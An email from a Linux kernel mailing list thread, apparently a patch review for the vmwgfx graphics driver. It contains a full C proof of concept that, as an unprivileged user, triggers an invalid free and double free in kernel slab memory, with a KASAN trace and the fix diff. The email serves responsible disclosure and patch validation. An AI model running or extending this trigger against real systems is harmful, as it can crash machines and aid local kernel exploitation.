Return-Path: <dri-devel-bounces@lists.freedesktop.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from gabe.freedesktop.org (gabe.freedesktop.org [131.252.210.177])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 16D47C9830B
	for <dri-devel@archiver.kernel.org>; Wed, 23 Sep 2026 14:59:31 +0000 (UTC)
Received: from gabe.freedesktop.org (localhost [127.0.0.1])
	by gabe.freedesktop.org (Postfix) with ESMTP id 7D04C10F0F3;
	Wed, 23 Sep 2026 14:59:30 +0000 (UTC)
Authentication-Results: gabe.freedesktop.org;
	dkim=pass (2048-bit key; unprotected) header.d=gmail.com header.i=@gmail.com header.b="ZVsuFeql";
	dkim-atps=neutral
Received: from mail-yx2-f13.google.com (mail-yx2-f13.google.com
 [74.125.224.141])
 by gabe.freedesktop.org (Postfix) with ESMTPS id 6448110F0E9
 for <dri-devel@lists.freedesktop.org>; Wed, 23 Sep 2026 14:59:29 +0000 (UTC)
Received: by mail-yx2-f13.google.com with SMTP id
 956f58d0204a3-66fb93aee5eso1110729d50.1
 for <dri-devel@lists.freedesktop.org>; Wed, 23 Sep 2026 07:59:29 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1790175568; cv=none;
 d=google.com; s=arc-20260327;
 b=jfy7z03xYS19fbSMqWAnHh/WeAGcXD2fMTCd32jE0PccEpif7AomBzvGedJLQ0Ijeo
 gesHu4FE7Pw9GOymbt0whrmJRm65Qj6ITc3ZX2xLKcEUn4VyzhHyyAyAa4oJWrTZD/A1
 yr20z8OV257pQxLCwTHFpd063eKFL7uHsgpefDKXoGY1g5XlEZ9cJgKd4sLR2+UFJMrC
 oTYkuzWPvk0cPmYWC3O/6v7LqRGANwF4u6HeO5qn64FiGjDz+IvYDHuzE2QOZihRWqK7
 VC8exAjoeHi5iRt3Uh85IvaQBMTx76LgdCpn4tx4Yy0iNuiivsxVmEfx66rfHR5n+YjQ
 kfCg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com;
 s=arc-20260327; 
 h=cc:to:subject:message-id:date:mime-version:references:in-reply-to
 :from:dkim-signature;
 bh=cDeqwRv9vxAKvAwZM4JyrKj4RFaK4WAg4Pj73bmAzWQ=;
 fh=p2knoRTqektelFU0ivSm0MWjZhbYHlR7oyYHfSx8zzU=;
 b=sl1eo22JYISMf3NvAySX1q+pZ80NpPb6Vc+DLN5kAPw74r+QwGx2DIVyDWOGj3Q6TF
 fg0TCp84yjmBZQcOUCSubMhSC4fNwcZo0/XBP/14KHyU+qY+TNFAgEdfSZm8M8UIETtu
 pNswdW9pVqY6e88P9uSWOoFBRZTkArqHWtOxrVD5GICzt2PjOfZoc7enf5OTltzmM45J
 sIoDZqJwnvPud0XEHM4NXx5AKglc09F7uVzYNurMqHIn/C8LTERyvGPNlKOeqg5AZ5pH
 bLU/0G34oai5mV3qq/tah5dWzC6R3XQNWGnnOaqMO2sihsZX2e0rFp5ulkex3/Ne6mun
 vDrQ==; darn=lists.freedesktop.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=gmail.com; s=20251104; t=1790175568; x=1790780368; darn=lists.freedesktop.org;
 h=content-type:cc:to:subject:message-id:date:mime-version:references
 :in-reply-to:from:from:to:cc:subject:date:message-id:reply-to
 :content-type; bh=cDeqwRv9vxAKvAwZM4JyrKj4RFaK4WAg4Pj73bmAzWQ=;
 b=ZVsuFeqlVbUsgE60k7TQ1SOTVdB4MMUtc7OjF78aB1U6FEijqOzwL2It2uguWdce4K
 dgrWl7qDInhCeoryqSeacsbBqQbHID3Qm0+7wRbJJR04SXsWZDQGyrVqk/TJfCHOSd7v
 TfirLqoYE55g5i4g8c2mzg/CQ2xcBEKm/ZHgsgjw74L3TgqHyVPCDE7v0zHCCpen31hx
 20rcSwvLnidk0QbP/QFVn6widDx6wUjrORZeRJiiYlzp+EQKEJLYGzSijkbrioYQCFP5
 4Q41H8LidvXsw2xuL0gHs+AEXictjeYDpLiGFgy4j+TMOqmWL+xmFY3S4eqbJ8a1JfbF
 AF2w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20260707; t=1790175568; x=1790780368;
 h=content-type:cc:to:subject:message-id:date:mime-version:references
 :in-reply-to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
 :message-id:reply-to:content-type;
 bh=cDeqwRv9vxAKvAwZM4JyrKj4RFaK4WAg4Pj73bmAzWQ=;
 b=rgkruT9j2W0CXvEJS4ZKl08QscDCzsPIU84/sxr1T7PdhkPwY4N+1oOiGEdJ7P8ihw
 sjqwkG+t+PPnypek/j9eZQYdcwrBa0g9rDISskHOFDcQ+OEtxoDa0OTsr+zkhZ2YHNIY
 PYxXKadhEapfJ4Z36PitLcYB6b6jIN/KvPQKNFiJp9DQKXs+/GWgr58GZAioa9OtUVtT
 f9iPjbvcdV+dV0VmqXzHwkFIj4NcelCEDNYS7SzCcrBLyC/W1qRo85ZnDVyC+eGmIAfm
 fHpk0i5f+4czQEhjA6n74TNifAdvtEf7cpVUQtGUTi2771oaeTe10QU4mABmfCnJV5e3
 KgSw==
X-Forwarded-Encrypted: i=1;
 AKwUvBxyYX4X0Ar3yVWMs3d2DDhlMVvIcKYrdfo0AO/rcbthzYOwNFpCpt5js8OSg+UCl7JwdNIzYg0Rjmw=@lists.freedesktop.org
X-Gm-Message-State: AFuF++mkqb+x32T2usdzw/3G9fcFI6qc6x52agfoVobJPx5oJUKqM8yh
 Uj5CIN+KClN+zaLukEtV6zPfL3doL4+7htX8mtUcIskk9Lls4HtMxAdjD/8CXD7Q6OYBiSRC9HX
 MuFOBv+F/RT5aVipyLjxMkt4g5RnfXC/687Z9
X-Gm-Gg: AYBFou09j5FQqrW7f4mLJGGSh+CFTcJykCPOT+H1fpayYZFh9rWXsdZAxC0Ne61CFy1
 qDkidwc1ESNulr12E+s7N+hu4LlqKUk40+GWtPMJT8MFBUsaPt4GcfUloZVZFoRtGcLDV/Cfnuh
 b5aP3V2f3a1qPJSyb+/BkR0oTVIw/89EIMpTImNXWuRcCOTaADaEXpsgBeax+SUmKm50NvDTHQK
 imyQFnV+CVKgHPBXF2Nzfqdoo6FACK/OCRMFYAN12LxmDre1cf2MzQZ3xMJ6IRIetNXgDKKxQ1S
 t2Blm/8eEBJbcLEzpUz72DFjIblmk4Ve8oLY+8S1jk9xc5/j3z1S9Kt5OxizbZSsoRAqBgb678j
 py7dfxV4=
X-Received: by 2002:a05:690e:b87:b0:671:203c:2fd1 with SMTP id
 956f58d0204a3-672d5991e7cmr1346989d50.70.1790175567695; Wed, 23 Sep 2026
 07:59:27 -0700 (PDT)
Received: from 101988054943 named unknown by gmailapi.google.com with
 HTTPREST; Wed, 23 Sep 2026 07:59:26 -0700
Received: from 101988054943 named unknown by gmailapi.google.com with
 HTTPREST; Wed, 23 Sep 2026 07:59:26 -0700
From: Aldo Ariel <qwe.aldo@gmail.com>
In-Reply-To: <CABQX2QMUUf1ETuLmvrzQ9_rsX4+KG32YAQJ-9hV3uakAyPiYrg@mail.gmail.com>
References: <CABQX2QMUUf1ETuLmvrzQ9_rsX4+KG32YAQJ-9hV3uakAyPiYrg@mail.gmail.com>
MIME-Version: 1.0
Date: Wed, 23 Sep 2026 07:59:26 -0700
X-Gm-Features: AclHuK-Wf0FoEyeMfXplI1OsdSvxrdq8-liZQq4T9TYQZzMa79OUQKGLuPhWqgY
Message-ID: <CAP48HfviFZXacVY9Lj4Hv7+brObhmxWLYAM8MNiTUkJNchnp1Q@mail.gmail.com>
Subject: Re: Re: [PATCH] drm/vmwgfx: do not hand the embedded sg_table to the
 PRIME core
To: zack.rusin@broadcom.com
Cc: bcm-kernel-feedback-list@broadcom.com, dri-devel@lists.freedesktop.org, 
 christian.koenig@amd.com, linux-kernel@vger.kernel.org, 
 stable@vger.kernel.org
Content-Type: multipart/alternative; boundary="000000000000cca1bc065c27baea"
X-BeenThere: dri-devel@lists.freedesktop.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Direct Rendering Infrastructure - Development
 <dri-devel.lists.freedesktop.org>
List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=unsubscribe>
List-Archive: <https://lists.freedesktop.org/archives/dri-devel>
List-Post: <mailto:dri-devel@lists.freedesktop.org>
List-Help: <mailto:dri-devel-request@lists.freedesktop.org?subject=help>
List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/dri-devel>,
 <mailto:dri-devel-request@lists.freedesktop.org?subject=subscribe>
Errors-To: dri-devel-bounces@lists.freedesktop.org
Sender: "dri-devel" <dri-devel-bounces@lists.freedesktop.org>

--000000000000cca1bc065c27baea
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi Zack,

Sure =E2=80=94 here is a standalone reproducer that triggers the invalid-fr=
ee.
It only needs a vmwgfx render node and runs as an unprivileged user:

gcc -O2 -Wall -o poc_sgtable poc_sgtable.c
./poc_sgtable /dev/dri/renderD128

Steps:
1. Allocate a BO on fd1 (DRM_VMW_ALLOC_BO).
2. mmap + write to populate TTM pages and trigger vmw_ttm_map_dma(),
which sets vsgt.sgt =3D &vmw_tt->sgt (the embedded member).
3. PRIME-export the handle (PRIME_HANDLE_TO_FD).
4. PRIME-import on a second fd (PRIME_FD_TO_HANDLE). This calls
drm_gem_map_dma_buf() -> vmw_gem_object_get_sg_table(), which
returns the embedded &vmw_tt->sgt.
5. Close fd2. The detach path in drm_gem_unmap_dma_buf() does:
sg_free_table(sgt); /* destroys vmwgfx's own scatterlist */
kfree(sgt); /* kfree on interior pointer */

With KASAN the result is immediate:

BUG: KASAN: invalid-free in drm_gem_unmap_dma_buf+0xb3/0xf0
Free of addr ffff888008290450 by task poc_sgtable/321
kasan_report_invalid_free+0x94/0xc0
kfree+0x103/0x360
drm_gem_unmap_dma_buf+0xb3/0xf0
dma_buf_detach+0x165/0x510

Without KASAN, the double-free silently corrupts the kmalloc-192 slab
(the freed pointer is 80 bytes inside the 144-byte vmw_ttm_tt object).

I will follow up with full igt vmwgfx results once I have the test VM
configured; in the meantime the splat above is from 6.12.101 with
CONFIG_KASAN=3Dy.

Re your request for the other patch (GB-surface backup NULL check):
I will prepare a similar standalone test for that one as well.

The PoC source is below.

Thanks,
Aldo

---8<--- poc_sgtable.c ---8<---

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <drm/drm.h>
#include <drm/vmwgfx_drm.h>

#define PAGE_SIZE 4096

#define DRM_IOCTL_VMW_ALLOC_BO \
DRM_IOWR(DRM_COMMAND_BASE + DRM_VMW_ALLOC_BO, \
struct drm_vmw_alloc_bo_req)

struct vmw_alloc_bo_arg {
struct drm_vmw_alloc_bo_req req;
struct drm_vmw_bo_rep rep;
};

static int vmw_alloc_bo(int fd, uint32_t size, uint32_t *handle,
uint64_t *map_handle)
{
struct vmw_alloc_bo_arg arg;

memset(&arg, 0, sizeof(arg));
arg.req.size =3D size;

if (ioctl(fd, DRM_IOCTL_VMW_ALLOC_BO, &arg) < 0)
return -errno;

*handle =3D arg.rep.handle;
*map_handle =3D arg.rep.map_handle;
return 0;
}

static int prime_handle_to_fd(int fd, uint32_t handle, int *prime_fd)
{
struct drm_prime_handle args =3D {
.handle =3D handle,
.flags =3D DRM_CLOEXEC | DRM_RDWR,
};

if (ioctl(fd, DRM_IOCTL_PRIME_HANDLE_TO_FD, &args) < 0)
return -errno;

*prime_fd =3D args.fd;
return 0;
}

static int prime_fd_to_handle(int fd, int prime_fd, uint32_t *handle)
{
struct drm_prime_handle args =3D {
.fd =3D prime_fd,
};

if (ioctl(fd, DRM_IOCTL_PRIME_FD_TO_HANDLE, &args) < 0)
return -errno;

*handle =3D args.handle;
return 0;
}

int main(int argc, char *argv[])
{
const char *dev =3D argc > 1 ? argv[1] : "/dev/dri/renderD128";
int fd1, fd2, prime_fd =3D -1;
uint32_t handle1 =3D 0, handle2 =3D 0;
uint64_t map_handle =3D 0;
void *map;
int ret;

printf("vmwgfx sg_table interior-pointer kfree PoC\n");
printf("Device: %s\n\n", dev);

fd1 =3D open(dev, O_RDWR);
if (fd1 < 0) { perror("open fd1"); return 1; }
fd2 =3D open(dev, O_RDWR);
if (fd2 < 0) { perror("open fd2"); return 1; }

ret =3D vmw_alloc_bo(fd1, PAGE_SIZE, &handle1, &map_handle);
if (ret) { fprintf(stderr, "alloc_bo: %s\n", strerror(-ret)); return 1; }
printf("[+] BO allocated: handle=3D%u map_handle=3D0x%llx\n",
handle1, (unsigned long long)map_handle);

map =3D mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED,
fd1, map_handle);
if (map =3D=3D MAP_FAILED) { perror("mmap"); return 1; }
memset(map, 0x41, PAGE_SIZE);
munmap(map, PAGE_SIZE);
printf("[+] Buffer populated (DMA mapped)\n");

ret =3D prime_handle_to_fd(fd1, handle1, &prime_fd);
if (ret) { fprintf(stderr, "PRIME_HANDLE_TO_FD: %s\n", strerror(-ret));
return 1; }
printf("[+] PRIME exported: prime_fd=3D%d\n", prime_fd);

ret =3D prime_fd_to_handle(fd2, prime_fd, &handle2);
if (ret) {
fprintf(stderr, "PRIME_FD_TO_HANDLE: %s\n", strerror(-ret));
printf("[!] Import failed -- check dmesg for KASAN: invalid-free\n");
} else {
printf("[+] PRIME imported on fd2: handle=3D%u\n", handle2);
}

close(fd2);
printf("[+] fd2 closed -- check dmesg for:\n");
printf(" BUG: KASAN: invalid-free in drm_gem_unmap_dma_buf\n");

close(prime_fd);
close(fd1);
return 0;
}

On Wed, Sep 23, 2026 11:38 AM, Zack Rusin <zack.rusin@broadcom.com> wrote:

> On Wed, Sep 23, 2026 at 8:26=E2=80=AFAM Aldo Ariel Panzardo <qwe.aldo@gma=
il.com>
> wrote:
> >
> > vmw_gem_object_get_sg_table() returns vmw_tt->vsgt.sgt when the buffer
> > object has already been DMA mapped.  vmw_ttm_map_dma() sets that field
> > to &vmw_tt->sgt, which is a member embedded inside the struct
> > vmw_ttm_tt allocation and not a table of its own.
> >
> > The core owns whatever .get_sg_table returns.  drm_gem_map_dma_buf()
> > takes the table and drm_gem_unmap_dma_buf() destroys it in full:
> >
> >         dma_unmap_sgtable(attach->dev, sgt, dir,
> DMA_ATTR_SKIP_CPU_SYNC);
> >         sg_free_table(sgt);
> >         kfree(sgt);
> >
> > Both are ops of drm_gem_prime_dmabuf_ops, so the core ends up calling
> > kfree() on &vmw_tt->sgt, which is not the start of an allocation.  The
> > preceding sg_free_table() also destroys a scatterlist that vmwgfx still
> > considers its own and frees again from vmw_ttm_unmap_dma().
> >
> > drm_gem_unmap_dma_buf() runs from dma_buf_detach(), including the
> > importer's error path, so a failed import is enough to reach it:
> > exporting a bound buffer with DRM_IOCTL_PRIME_HANDLE_TO_FD and
> > importing it on a second DRM device with DRM_IOCTL_PRIME_FD_TO_HANDLE
> > is sufficient.  Both ioctls are DRM_RENDER_ALLOW.
> >
> > Observed on 6.12.101 with KASAN, as uid 65534:
> >
> >   BUG: KASAN: invalid-free in drm_gem_unmap_dma_buf+0xb3/0xf0
> >   Free of addr ffff888008290450 by task poc_mm04_sgtabl/321
> >   CPU: 1 UID: 65534 PID: 321 Comm: poc_mm04_sgtabl Not tainted 6.12.101
> #4
> >    kasan_report_invalid_free+0x94/0xc0
> >    check_slab_allocation+0x116/0x120
> >    kfree+0x103/0x360
> >    drm_gem_unmap_dma_buf+0xb3/0xf0
> >    dma_buf_detach+0x165/0x510
> >    drm_gem_prime_import_dev+0x33e/0x430
> >   which belongs to the cache kmalloc-192 of size 192
> >   The buggy address is located 80 bytes inside of
> >    144-byte region [ffff888008290400, ffff888008290490)
> >
> > 80 is offsetof(struct vmw_ttm_tt, sgt) and 144 is sizeof(struct
> > vmw_ttm_tt), which identifies the freed pointer as the embedded member.
> >
> > Always return a table the core can own, as the other drivers do.
> > Reusing the cached representation would require copying it into a
> > freshly allocated sg_table, never returning the alias.
> >
> > Fixes: 8afa13a0583f ("drm/vmwgfx: Implement DRIVER_GEM")
> > Cc: stable@vger.kernel.org
> > Signed-off-by: Aldo Ariel Panzardo <qwe.aldo@gmail.com>
> > ---
> >  drivers/gpu/drm/vmwgfx/vmwgfx_gem.c | 11 +++++++----
> >  1 file changed, 7 insertions(+), 4 deletions(-)
> >
> > diff --git a/drivers/gpu/drm/vmwgfx/vmwgfx_gem.c
> b/drivers/gpu/drm/vmwgfx/vmwgfx_gem.c
> > index 39f8c4655..a0233729b 100644
> > --- a/drivers/gpu/drm/vmwgfx/vmwgfx_gem.c
> > +++ b/drivers/gpu/drm/vmwgfx/vmwgfx_gem.c
> > @@ -73,10 +73,13 @@ static struct sg_table *vmw_gem_object_get_sg_table=
(struct
> drm_gem_object *obj)
> >         struct vmw_ttm_tt *vmw_tt =3D
> >                 container_of(bo->ttm, struct vmw_ttm_tt, dma_ttm);
> >
> > -       if (vmw_tt->vsgt.sgt)
> > -               return vmw_tt->vsgt.sgt;
> > -
> > -       return drm_prime_pages_to_sg(obj->dev, vmw_tt->dma_ttm.pages,
> vmw_tt->dma_ttm.num_pages);
> > +       /*
> > +        * Do not return &vmw_tt->sgt: the core owns what this returns
> and
> > +        * drm_gem_unmap_dma_buf() sg_free_table()s and kfree()s it, bu=
t
> that
> > +        * sg_table is embedded in the vmw_ttm_tt allocation.
> > +        */
> > +       return drm_prime_pages_to_sg(obj->dev, vmw_tt->dma_ttm.pages,
> > +                                    vmw_tt->dma_ttm.num_pages);
> >  }
> >
> >  static int vmw_gem_vmap(struct drm_gem_object *obj, struct iosys_map
> *map)
> > --
> > 2.43.0
> >
>
> Thank you. Because of the influx of llm patches it's very hard to
> reason about what's valid and what's not if it comes without a
> reproducible testcase. Could you please add an igt testcase for this
> and then include the full igt results for vmwgfx before and after this
> change? Same for your other change.
>
> z
>

--000000000000cca1bc065c27baea
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

<html><body><div dir=3D"auto">Hi Zack,<br><br>Sure =E2=80=94 here is a stan=
dalone reproducer that triggers the invalid-free.<br>It only needs a vmwgfx=
 render node and runs as an unprivileged user:<br><br>  gcc -O2 -Wall -o po=
c_sgtable poc_sgtable.c<br>  ./poc_sgtable /dev/dri/renderD128<br><br>Steps=
:<br>  1. Allocate a BO on fd1 (DRM_VMW_ALLOC_BO).<br>  2. mmap + write to =
populate TTM pages and trigger vmw_ttm_map_dma(),<br>     which sets vsgt.s=
gt =3D &amp;vmw_tt-&gt;sgt (the embedded member).<br>  3. PRIME-export the =
handle (PRIME_HANDLE_TO_FD).<br>  4. PRIME-import on a second fd (PRIME_FD_=
TO_HANDLE). This calls<br>     drm_gem_map_dma_buf() -&gt; vmw_gem_object_g=
et_sg_table(), which<br>     returns the embedded &amp;vmw_tt-&gt;sgt.<br> =
 5. Close fd2. The detach path in drm_gem_unmap_dma_buf() does:<br>       s=
g_free_table(sgt);   /* destroys vmwgfx&#39;s own scatterlist */<br>       =
kfree(sgt);           /* kfree on interior pointer */<br><br>With KASAN the=
 result is immediate:<br><br>  BUG: KASAN: invalid-free in drm_gem_unmap_dm=
a_buf+0xb3/0xf0<br>  Free of addr ffff888008290450 by task poc_sgtable/321<=
br>   kasan_report_invalid_free+0x94/0xc0<br>   kfree+0x103/0x360<br>   drm=
_gem_unmap_dma_buf+0xb3/0xf0<br>   dma_buf_detach+0x165/0x510<br><br>Withou=
t KASAN, the double-free silently corrupts the kmalloc-192 slab<br>(the fre=
ed pointer is 80 bytes inside the 144-byte vmw_ttm_tt object).<br><br>I wil=
l follow up with full igt vmwgfx results once I have the test VM<br>configu=
red; in the meantime the splat above is from 6.12.101 with<br>CONFIG_KASAN=
=3Dy.<br><br>Re your request for the other patch (GB-surface backup NULL ch=
eck):<br>I will prepare a similar standalone test for that one as well.<br>=
<br>The PoC source is below.<br><br>Thanks,<br>Aldo<br><br>---8&lt;--- poc_=
sgtable.c ---8&lt;---<br><br>#include &lt;errno.h&gt;<br>#include &lt;fcntl=
.h&gt;<br>#include &lt;stdint.h&gt;<br>#include &lt;stdio.h&gt;<br>#include=
 &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/ioctl.h&=
gt;<br>#include &lt;sys/mman.h&gt;<br>#include &lt;unistd.h&gt;<br>#include=
 &lt;drm/drm.h&gt;<br>#include &lt;drm/vmwgfx_drm.h&gt;<br><br>#define PAGE=
_SIZE 4096<br><br>#define DRM_IOCTL_VMW_ALLOC_BO \<br>	DRM_IOWR(DRM_COMMAND=
_BASE + DRM_VMW_ALLOC_BO, \<br>		  struct drm_vmw_alloc_bo_req)<br><br>stru=
ct vmw_alloc_bo_arg {<br>	struct drm_vmw_alloc_bo_req req;<br>	struct drm_v=
mw_bo_rep rep;<br>};<br><br>static int vmw_alloc_bo(int fd, uint32_t size, =
uint32_t *handle,<br>			uint64_t *map_handle)<br>{<br>	struct vmw_alloc_bo_=
arg arg;<br><br>	memset(&amp;arg, 0, sizeof(arg));<br>	arg.req.size =3D siz=
e;<br><br>	if (ioctl(fd, DRM_IOCTL_VMW_ALLOC_BO, &amp;arg) &lt; 0)<br>		ret=
urn -errno;<br><br>	*handle =3D arg.rep.handle;<br>	*map_handle =3D arg.rep=
.map_handle;<br>	return 0;<br>}<br><br>static int prime_handle_to_fd(int fd=
, uint32_t handle, int *prime_fd)<br>{<br>	struct drm_prime_handle args =3D=
 {<br>		.handle =3D handle,<br>		.flags  =3D DRM_CLOEXEC | DRM_RDWR,<br>	};=
<br><br>	if (ioctl(fd, DRM_IOCTL_PRIME_HANDLE_TO_FD, &amp;args) &lt; 0)<br>=
		return -errno;<br><br>	*prime_fd =3D args.fd;<br>	return 0;<br>}<br><br>s=
tatic int prime_fd_to_handle(int fd, int prime_fd, uint32_t *handle)<br>{<b=
r>	struct drm_prime_handle args =3D {<br>		.fd =3D prime_fd,<br>	};<br><br>=
	if (ioctl(fd, DRM_IOCTL_PRIME_FD_TO_HANDLE, &amp;args) &lt; 0)<br>		return=
 -errno;<br><br>	*handle =3D args.handle;<br>	return 0;<br>}<br><br>int mai=
n(int argc, char *argv[])<br>{<br>	const char *dev =3D argc &gt; 1 ? argv[1=
] : &quot;/dev/dri/renderD128&quot;;<br>	int fd1, fd2, prime_fd =3D -1;<br>=
	uint32_t handle1 =3D 0, handle2 =3D 0;<br>	uint64_t map_handle =3D 0;<br>	=
void *map;<br>	int ret;<br><br>	printf(&quot;vmwgfx sg_table interior-point=
er kfree PoC\n&quot;);<br>	printf(&quot;Device: %s\n\n&quot;, dev);<br><br>=
	fd1 =3D open(dev, O_RDWR);<br>	if (fd1 &lt; 0) { perror(&quot;open fd1&quo=
t;); return 1; }<br>	fd2 =3D open(dev, O_RDWR);<br>	if (fd2 &lt; 0) { perro=
r(&quot;open fd2&quot;); return 1; }<br><br>	ret =3D vmw_alloc_bo(fd1, PAGE=
_SIZE, &amp;handle1, &amp;map_handle);<br>	if (ret) { fprintf(stderr, &quot=
;alloc_bo: %s\n&quot;, strerror(-ret)); return 1; }<br>	printf(&quot;[+] BO=
 allocated: handle=3D%u map_handle=3D0x%llx\n&quot;,<br>	       handle1, (u=
nsigned long long)map_handle);<br><br>	map =3D mmap(NULL, PAGE_SIZE, PROT_R=
EAD | PROT_WRITE, MAP_SHARED,<br>		   fd1, map_handle);<br>	if (map =3D=3D =
MAP_FAILED) { perror(&quot;mmap&quot;); return 1; }<br>	memset(map, 0x41, P=
AGE_SIZE);<br>	munmap(map, PAGE_SIZE);<br>	printf(&quot;[+] Buffer populate=
d (DMA mapped)\n&quot;);<br><br>	ret =3D prime_handle_to_fd(fd1, handle1, &=
amp;prime_fd);<br>	if (ret) { fprintf(stderr, &quot;PRIME_HANDLE_TO_FD: %s\=
n&quot;, strerror(-ret)); return 1; }<br>	printf(&quot;[+] PRIME exported: =
prime_fd=3D%d\n&quot;, prime_fd);<br><br>	ret =3D prime_fd_to_handle(fd2, p=
rime_fd, &amp;handle2);<br>	if (ret) {<br>		fprintf(stderr, &quot;PRIME_FD_=
TO_HANDLE: %s\n&quot;, strerror(-ret));<br>		printf(&quot;[!] Import failed=
 -- check dmesg for KASAN: invalid-free\n&quot;);<br>	} else {<br>		printf(=
&quot;[+] PRIME imported on fd2: handle=3D%u\n&quot;, handle2);<br>	}<br><b=
r>	close(fd2);<br>	printf(&quot;[+] fd2 closed -- check dmesg for:\n&quot;)=
;<br>	printf(&quot;      BUG: KASAN: invalid-free in drm_gem_unmap_dma_buf\=
n&quot;);<br><br>	close(prime_fd);<br>	close(fd1);<br>	return 0;<br>}</div>=
</body></html><br><div class=3D"gmail_extra"><div>On Wed, Sep 23, 2026 11:3=
8 AM, Zack Rusin &lt;<a href=3D"mailto:zack.rusin@broadcom.com">zack.rusin@=
broadcom.com</a>&gt; wrote:<br><blockquote class=3D"gmail_quote" style=3D"m=
argin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">On Wed, Sep 2=
3, 2026 at 8:26=E2=80=AFAM Aldo Ariel Panzardo &lt;<a href=3D"mailto:qwe.al=
do@gmail.com" target=3D"_blank">qwe.aldo@gmail.com</a>&gt; wrote:<br>
&gt;<br>
&gt; vmw_gem_object_get_sg_table() returns vmw_tt-&gt;vsgt.sgt when the buf=
fer<br>
&gt; object has already been DMA mapped.=C2=A0 vmw_ttm_map_dma() sets that =
field<br>
&gt; to &amp;vmw_tt-&gt;sgt, which is a member embedded inside the struct<b=
r>
&gt; vmw_ttm_tt allocation and not a table of its own.<br>
&gt;<br>
&gt; The core owns whatever .get_sg_table returns.=C2=A0 drm_gem_map_dma_bu=
f()<br>
&gt; takes the table and drm_gem_unmap_dma_buf() destroys it in full:<br>
&gt;<br>
&gt;=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0dma_unmap_sgtable(attach-&gt;<wbr>dev=
, sgt, dir, DMA_ATTR_SKIP_CPU_SYNC);<br>
&gt;=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0sg_free_table(sgt);<br>
&gt;=C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0kfree(sgt);<br>
&gt;<br>
&gt; Both are ops of drm_gem_prime_dmabuf_ops, so the core ends up calling<=
br>
&gt; kfree() on &amp;vmw_tt-&gt;sgt, which is not the start of an allocatio=
n.=C2=A0 The<br>
&gt; preceding sg_free_table() also destroys a scatterlist that vmwgfx stil=
l<br>
&gt; considers its own and frees again from vmw_ttm_unmap_dma().<br>
&gt;<br>
&gt; drm_gem_unmap_dma_buf() runs from dma_buf_detach(), including the<br>
&gt; importer&#39;s error path, so a failed import is enough to reach it:<b=
r>
&gt; exporting a bound buffer with DRM_IOCTL_PRIME_HANDLE_TO_FD and<br>
&gt; importing it on a second DRM device with DRM_IOCTL_PRIME_FD_TO_HANDLE<=
br>
&gt; is sufficient.=C2=A0 Both ioctls are DRM_RENDER_ALLOW.<br>
&gt;<br>
&gt; Observed on 6.12.101 with KASAN, as uid 65534:<br>
&gt;<br>
&gt;=C2=A0 =C2=A0BUG: KASAN: invalid-free in drm_gem_unmap_dma_buf+0xb3/0xf=
<wbr>0<br>
&gt;=C2=A0 =C2=A0Free of addr ffff888008290450 by task poc_mm04_sgtabl/321<=
br>
&gt;=C2=A0 =C2=A0CPU: 1 UID: 65534 PID: 321 Comm: poc_mm04_sgtabl Not taint=
ed 6.12.101 #4<br>
&gt;=C2=A0 =C2=A0 kasan_report_invalid_free+0x94<wbr>/0xc0<br>
&gt;=C2=A0 =C2=A0 check_slab_allocation+0x116/0x<wbr>120<br>
&gt;=C2=A0 =C2=A0 kfree+0x103/0x360<br>
&gt;=C2=A0 =C2=A0 drm_gem_unmap_dma_buf+0xb3/0xf<wbr>0<br>
&gt;=C2=A0 =C2=A0 dma_buf_detach+0x165/0x510<br>
&gt;=C2=A0 =C2=A0 drm_gem_prime_import_dev+0x33e<wbr>/0x430<br>
&gt;=C2=A0 =C2=A0which belongs to the cache kmalloc-192 of size 192<br>
&gt;=C2=A0 =C2=A0The buggy address is located 80 bytes inside of<br>
&gt;=C2=A0 =C2=A0 144-byte region [ffff888008290400, ffff888008290490)<br>
&gt;<br>
&gt; 80 is offsetof(struct vmw_ttm_tt, sgt) and 144 is sizeof(struct<br>
&gt; vmw_ttm_tt), which identifies the freed pointer as the embedded member=
.<br>
&gt;<br>
&gt; Always return a table the core can own, as the other drivers do.<br>
&gt; Reusing the cached representation would require copying it into a<br>
&gt; freshly allocated sg_table, never returning the alias.<br>
&gt;<br>
&gt; Fixes: 8afa13a0583f (&quot;drm/vmwgfx: Implement DRIVER_GEM&quot;)<br>
&gt; Cc: <a href=3D"mailto:stable@vger.kernel.org" target=3D"_blank">stable=
@vger.kernel.org</a><br>
&gt; Signed-off-by: Aldo Ariel Panzardo &lt;<a href=3D"mailto:qwe.aldo@gmai=
l.com" target=3D"_blank">qwe.aldo@gmail.com</a>&gt;<br>
&gt; ---<br>
&gt;=C2=A0 drivers/gpu/drm/vmwgfx/vmwgfx_<wbr>gem.c | 11 +++++++----<br>
&gt;=C2=A0 1 file changed, 7 insertions(+), 4 deletions(-)<br>
&gt;<br>
&gt; diff --git a/drivers/gpu/drm/vmwgfx/vmwgf<wbr>x_gem.c b/drivers/gpu/dr=
